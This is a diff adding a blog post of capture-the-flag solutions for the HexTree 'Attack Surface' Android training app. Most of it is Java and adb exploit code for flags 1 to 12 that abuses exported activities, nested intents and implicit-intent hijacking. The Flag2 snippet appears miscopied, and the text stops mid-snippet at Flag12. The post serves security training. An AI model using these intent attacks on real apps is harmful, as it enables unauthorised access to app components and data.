@@ -1,0 +1,1445 @@
+<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="HexTree Attack Surface Android App Solutions" /><meta name="author" content="Muhammad Adel" /><meta property="og:locale" content="en_US" /><meta name="description" content="Introduction" /><meta property="og:description" content="Introduction" /><link rel="canonical" href="https://itsfading.github.io/posts/HexTree-Attack-Surface-App-Solutions/" /><meta property="og:url" content="https://itsfading.github.io/posts/HexTree-Attack-Surface-App-Solutions/" /><meta property="og:site_name" content="Muhammad Adel" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2024-11-06T13:40:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HexTree Attack Surface Android App Solutions" /><meta name="twitter:site" content="@ItsFadinG_" /><meta name="twitter:creator" content="@Muhammad Adel" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Muhammad Adel"},"dateModified":"2025-04-07T14:02:05+02:00","datePublished":"2024-11-06T13:40:00+02:00","description":"Introduction","headline":"HexTree Attack Surface Android App Solutions","mainEntityOfPage":{"@type":"WebPage","@id":"https://itsfading.github.io/posts/HexTree-Attack-Surface-App-Solutions/"},"url":"https://itsfading.github.io/posts/HexTree-Attack-Surface-App-Solutions/"}</script><title>HexTree Attack Surface Android App Solutions | Muhammad Adel</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Muhammad Adel"><meta name="application-name" content="Muhammad Adel"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/Mine.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Muhammad Adel</a></div><div class="site-subtitle font-italic">CyberSecurity geek, who wants to share his day-to-day knowledge</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://twitter.com/ItsFadinG_" aria-label="twitter" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="https://www.linkedin.com/in/muhammadadel14" aria-label="linkedin" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="https://github.com/ItsFadinG" aria-label="github" class="order-5" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['Muhammad.adel.tr','gmail.com'].join('@')" aria-label="email" class="order-6" > <i class="fas fa-envelope"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>HexTree Attack Surface Android App Solutions</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HexTree Attack Surface Android App Solutions</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Muhammad Adel </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Wed, Nov 6, 2024, 1:40 PM +0200" prep="on" > Nov 6, 2024 <i class="unloaded">2024-11-06T13:40:00+02:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, Apr 7, 2025, 2:02 PM +0200" prefix="Updated " > Apr 7 <i class="unloaded">2025-04-07T14:02:05+02:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2981 words">16 min</span></div></div><div class="post-content"><h2 id="introduction"><strong>Introduction</strong></h2><p>Peace be upon all of you. In this post I am going to share all the solutions for the Attack Surface Android app, which is part of the amazing Hextree Android Application Security course. This app is packed with hands-on challenges to practice many real-world Android vulnerabilities.</p><p>Course Link: <a href="https://app.hextree.io/map/android">https://app.hextree.io/map/android</a></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/HexTree/1.jpeg" alt="image.png" /></p><h2 id="intents-attacks"><strong>Intents Attacks</strong></h2><h3 id="flag1"><strong>Flag1</strong></h3><blockquote><p>Basic exported activity</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>adb shell am start-activity <span class="nt">-n</span> io.hextree.attacksurface/io.hextree.attacksurface.activities.Flag1Activity
+</pre></table></code></div></div><h3 id="flag2"><strong>Flag2</strong></h3><blockquote><p>Intent with extras</p></blockquote><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="nc">Intent</span> <span class="n">exploitIntent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
+<span class="n">exploitIntent</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"io.hextree.attacksurface"</span><span class="o">,</span><span class="s">"io.hextree.attacksurface.activities.Flag3Activity"</span><span class="o">);</span>
+<span class="n">exploitIntent</span><span class="o">.</span><span class="na">setAction</span><span class="o">(</span><span class="s">"io.hextree.action.GIVE_FLAG"</span><span class="o">);</span>
+<span class="n">startActivity</span><span class="o">(</span><span class="n">exploitIntent</span><span class="o">);</span>
+</pre></table></code></div></div><h3 id="flag3"><strong>Flag3</strong></h3><blockquote><p>Intent with a data URI</p></blockquote><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre><span class="nc">Intent</span> <span class="n">exploitIntent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
+<span class="n">exploitIntent</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"io.hextree.attacksurface"</span><span class="o">,</span><span class="s">"io.hextree.attacksurface.activities.Flag3Activity"</span><span class="o">);</span>
+<span class="n">exploitIntent</span><span class="o">.</span><span class="na">setAction</span><span class="o">(</span><span class="s">"io.hextree.action.GIVE_FLAG"</span><span class="o">);</span>
+<span class="n">exploitIntent</span><span class="o">.</span><span class="na">setData</span><span class="o">(</span><span class="nc">Uri</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="s">"https://app.hextree.io/map/android"</span><span class="o">));</span>
+<span class="n">startActivity</span><span class="o">(</span><span class="n">exploitIntent</span><span class="o">);</span>
+</pre></table></code></div></div><h3 id="flag4"><strong>Flag4</strong></h3><blockquote><p>State Machine</p></blockquote><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre><td class="rouge-code"><pre><span class="nc">Intent</span> <span class="n">exploitIntent3</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
+<span class="n">exploitIntent3</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"io.hextree.attacksurface"</span><span class="o">,</span><span class="s">"io.hextree.attacksurface.activities.Flag4Activity"</span><span class="o">);</span>
+<span class="n">exploitIntent3</span><span class="o">.</span><span class="na">setAction</span><span class="o">(</span><span class="s">"GET_FLAG_ACTION"</span><span class="o">);</span>
+<span class="n">startActivity</span><span class="o">(</span><span class="n">exploitIntent3</span><span class="o">);</span>
+
+<span class="nc">Intent</span> <span class="n">exploitIntent2</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
+<span class="n">exploitIntent2</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"io.hextree.attacksurface"</span><span class="o">,</span><span class="s">"io.hextree.attacksurface.activities.Flag4Activity"</span><span class="o">);</span>
+<span class="n">exploitIntent2</span><span class="o">.</span><span class="na">setAction</span><span class="o">(</span><span class="s">"BUILD_ACTION"</span><span class="o">);</span>
+<span class="n">startActivity</span><span class="o">(</span><span class="n">exploitIntent2</span><span class="o">);</span>
+
+<span class="nc">Intent</span> <span class="n">exploitIntent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
+<span class="n">exploitIntent</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"io.hextree.attacksurface"</span><span class="o">,</span><span class="s">"io.hextree.attacksurface.activities.Flag4Activity"</span><span class="o">);</span>
+<span class="n">exploitIntent</span><span class="o">.</span><span class="na">setAction</span><span class="o">(</span><span class="s">"PREPARE_ACTION"</span><span class="o">);</span>
+<span class="n">startActivity</span><span class="o">(</span><span class="n">exploitIntent</span><span class="o">);</span>
+</pre></table></code></div></div><h3 id="flag5"><strong>Flag5</strong></h3><blockquote><p>Intent in intent</p></blockquote><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre><td class="rouge-code"><pre><span class="c1">// nextIntent -- Intent3</span>
+<span class="nc">Intent</span> <span class="n">exploitIntent3</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
+<span class="n">exploitIntent3</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"reason"</span><span class="o">,</span> <span class="s">"back"</span><span class="o">);</span>
+
+<span class="c1">// Intent2</span>
+<span class="nc">Intent</span> <span class="n">exploitIntent2</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
+<span class="n">exploitIntent2</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"return"</span><span class="o">,</span> <span class="mi">42</span><span class="o">);</span>
+<span class="n">exploitIntent2</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"nextIntent"</span><span class="o">,</span> <span class="n">exploitIntent3</span><span class="o">);</span>
+
+<span class="c1">// Main Intent -- Intent</span>
+<span class="nc">Intent</span> <span class="n">exploitIntent1</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
+<span class="n">exploitIntent1</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"io.hextree.attacksurface"</span><span class="o">,</span><span class="s">"io.hextree.attacksurface.activities.Flag5Activity"</span><span class="o">);</span>
+<span class="n">exploitIntent1</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"android.intent.extra.INTENT"</span><span class="o">,</span> <span class="n">exploitIntent2</span><span class="o">);</span>
+<span class="n">startActivity</span><span class="o">(</span><span class="n">exploitIntent1</span><span class="o">);</span>
+</pre></table></code></div></div><h3 id="flag6"><strong>Flag6</strong></h3><blockquote><p>Not Exported</p></blockquote><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre><td class="rouge-code"><pre><span class="c1">// nextIntent -- Intent3</span>
+<span class="nc">Intent</span> <span class="n">exploitIntent3</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
+<span class="n">exploitIntent3</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"reason"</span><span class="o">,</span> <span class="s">"next"</span><span class="o">);</span>
+<span class="n">exploitIntent3</span><span class="o">.</span><span class="na">setFlags</span><span class="o">(</span><span class="nc">Intent</span><span class="o">.</span><span class="na">FLAG_GRANT_READ_URI_PERMISSION</span><span class="o">);</span>
+<span class="n">exploitIntent3</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"io.hextree.attacksurface"</span><span class="o">,</span><span class="s">"io.hextree.attacksurface.activities.Flag6Activity"</span><span class="o">);</span>
+
+<span class="c1">// Intent2</span>
+<span class="nc">Intent</span> <span class="n">exploitIntent2</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
+<span class="n">exploitIntent2</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"return"</span><span class="o">,</span> <span class="mi">42</span><span class="o">);</span>
+<span class="n">exploitIntent2</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"nextIntent"</span><span class="o">,</span> <span class="n">exploitIntent3</span><span class="o">);</span>
+
+<span class="c1">// Main Intent -- Intent</span>
+<span class="nc">Intent</span> <span class="n">exploitIntent1</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
+<span class="n">exploitIntent1</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"io.hextree.attacksurface"</span><span class="o">,</span><span class="s">"io.hextree.attacksurface.activities.Flag5Activity"</span><span class="o">);</span>
+<span class="n">exploitIntent1</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"android.intent.extra.INTENT"</span><span class="o">,</span> <span class="n">exploitIntent2</span><span class="o">);</span>
+<span class="n">startActivity</span><span class="o">(</span><span class="n">exploitIntent1</span><span class="o">);</span>
+</pre></table></code></div></div><h3 id="flag7"><strong>Flag7</strong></h3><blockquote><p>Activity Lifecycle tricks</p></blockquote><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre><td class="rouge-code"><pre><span class="nc">Intent</span> <span class="nc">OpenIntent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
+<span class="nc">OpenIntent</span><span class="o">.</span><span class="na">setAction</span><span class="o">(</span><span class="s">"OPEN"</span><span class="o">);</span>
+<span class="nc">OpenIntent</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"io.hextree.attacksurface"</span><span class="o">,</span><span class="s">"io.hextree.attacksurface.activities.Flag7Activity"</span><span class="o">);</span>
+<span class="n">startActivity</span><span class="o">(</span><span class="nc">OpenIntent</span><span class="o">);</span>
+
+<span class="nc">Handler</span> <span class="n">handler</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Handler</span><span class="o">();</span>
+<span class="n">handler</span><span class="o">.</span><span class="na">postDelayed</span><span class="o">(()</span> <span class="o">-&gt;</span> <span class="o">{</span>
+    <span class="c1">// Send the "REOPEN" action to trigger onNewIntent</span>
+    <span class="nc">Intent</span> <span class="n">exploitIntent1</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
+    <span class="n">exploitIntent1</span><span class="o">.</span><span class="na">setAction</span><span class="o">(</span><span class="s">"REOPEN"</span><span class="o">);</span>
+    <span class="n">exploitIntent1</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"io.hextree.attacksurface"</span><span class="o">,</span><span class="s">"io.hextree.attacksurface.activities.Flag7Activity"</span><span class="o">);</span>
+    <span class="n">exploitIntent1</span><span class="o">.</span><span class="na">addFlags</span><span class="o">(</span><span class="nc">Intent</span><span class="o">.</span><span class="na">FLAG_ACTIVITY_SINGLE_TOP</span><span class="o">);</span>
+    <span class="n">startActivity</span><span class="o">(</span><span class="n">exploitIntent1</span><span class="o">);</span>
+<span class="o">},</span> <span class="mi">2000</span><span class="o">);</span>
+</pre></table></code></div></div><h3 id="flag8"><strong>Flag8</strong></h3><blockquote><p>Do you expect a result?</p></blockquote><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="c1">// Make sure your package Name contains "Hextree" </span>
+<span class="n">exploitIntent1</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
+<span class="n">exploitIntent1</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"io.hextree.attacksurface"</span><span class="o">,</span><span class="s">"io.hextree.attacksurface.activities.Flag8Activity"</span><span class="o">);</span>
+<span class="n">startActivityForResult</span><span class="o">(</span><span class="n">exploitIntent1</span><span class="o">,</span> <span class="mi">0</span><span class="o">);</span>
+</pre></table></code></div></div><h3 id="flag9"><strong>Flag9</strong></h3><blockquote><p>Receive result with flag</p></blockquote><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre><td class="rouge-code"><pre><span class="c1">// Make sure your package Name contains "Hextree" </span>
+<span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
+  <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
+  <span class="n">setContentView</span><span class="o">(</span><span class="no">R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">activity_main</span><span class="o">);</span>
+
+  <span class="c1">// Main Intent -- Intent</span>
+  <span class="nc">Intent</span> <span class="n">exploitIntent1</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
+  <span class="n">exploitIntent1</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"io.hextree.attacksurface"</span><span class="o">,</span><span class="s">"io.hextree.attacksurface.activities.Flag9Activity"</span><span class="o">);</span>
+  <span class="n">startActivityForResult</span><span class="o">(</span><span class="n">exploitIntent1</span><span class="o">,</span> <span class="mi">0</span><span class="o">);</span>
+<span class="o">}</span>
+
+<span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onActivityResult</span><span class="o">(</span><span class="kt">int</span> <span class="n">requestCode</span><span class="o">,</span> <span class="kt">int</span> <span class="n">resultCode</span><span class="o">,</span> <span class="nc">Intent</span> <span class="n">data</span><span class="o">)</span> <span class="o">{</span>
+  <span class="kd">super</span><span class="o">.</span><span class="na">onActivityResult</span><span class="o">(</span><span class="n">requestCode</span><span class="o">,</span> <span class="n">resultCode</span><span class="o">,</span> <span class="n">data</span><span class="o">);</span>
+  <span class="nc">String</span> <span class="n">result</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="na">getStringExtra</span><span class="o">(</span><span class="s">"flag"</span><span class="o">);</span>
+  <span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"Flag9"</span><span class="o">,</span> <span class="n">result</span><span class="o">);</span>
+<span class="o">}</span>
+</pre></table></code></div></div><h3 id="flag10"><strong>Flag10</strong></h3><blockquote><p>Hijack implicit intent with the flag</p></blockquote><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre><span class="nt">&lt;activity</span>
+    <span class="na">android:name=</span><span class="s">".SecondActivity"</span>
+    <span class="na">android:exported=</span><span class="s">"true"</span> <span class="nt">&gt;</span>
+<span class="nt">&lt;intent-filter&gt;</span>
+    <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">"io.hextree.attacksurface.ATTACK_ME"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">"android.intent.category.DEFAULT"</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;/intent-filter&gt;</span>
+<span class="nt">&lt;/activity&gt;</span>
+</pre></table></code></div></div><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre><span class="nc">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="n">getIntent</span><span class="o">();</span>
+<span class="k">if</span><span class="o">(</span><span class="s">"io.hextree.attacksurface.ATTACK_ME"</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">intent</span><span class="o">.</span><span class="na">getAction</span><span class="o">())){</span>
+    <span class="nc">String</span> <span class="n">flag</span> <span class="o">=</span> <span class="n">intent</span><span class="o">.</span><span class="na">getStringExtra</span><span class="o">(</span><span class="s">"flag"</span><span class="o">);</span>
+    <span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"Flag10"</span><span class="o">,</span> <span class="n">flag</span><span class="o">);</span>
+<span class="o">}</span><span class="k">else</span><span class="o">{</span>
+    <span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"Flag10"</span><span class="o">,</span> <span class="s">"Not Received"</span><span class="o">);</span>
+<span class="o">}</span>
+</pre></table></code></div></div><h3 id="flag11"><strong>Flag11</strong></h3><blockquote><p>Respond to implicit intent</p></blockquote><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre><span class="nt">&lt;activity</span>
+    <span class="na">android:name=</span><span class="s">".SecondActivity"</span>
+    <span class="na">android:exported=</span><span class="s">"true"</span> <span class="nt">&gt;</span>
+<span class="nt">&lt;intent-filter&gt;</span>
+    <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">"io.hextree.attacksurface.ATTACK_ME"</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">"android.intent.category.DEFAULT"</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;/intent-filter&gt;</span>
+<span class="nt">&lt;/activity&gt;</span>
+</pre></table></code></div></div><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre><span class="nc">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="n">getIntent</span><span class="o">();</span>
+<span class="k">if</span><span class="o">(</span><span class="s">"io.hextree.attacksurface.ATTACK_ME"</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">intent</span><span class="o">.</span><span class="na">getAction</span><span class="o">())){</span>
+    <span class="n">setResult</span><span class="o">(</span><span class="mi">42</span><span class="o">,</span> <span class="n">intent</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"token"</span><span class="o">,</span> <span class="mi">1094795585</span><span class="o">));</span>
+<span class="o">}</span><span class="k">else</span><span class="o">{</span>
+    <span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"Flag11"</span><span class="o">,</span> <span class="s">"Not Received"</span><span class="o">);</span>
+<span class="o">}</span>
+</pre></table></code></div></div><h3 id="flag12"><strong>Flag12</strong></h3><blockquote><p>Careful intent conditions</p></blockquote><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre><span class="nt">&lt;activity</span>
+    <span class="na">android:name=</span><span class="s">".SecondActivity"</span>
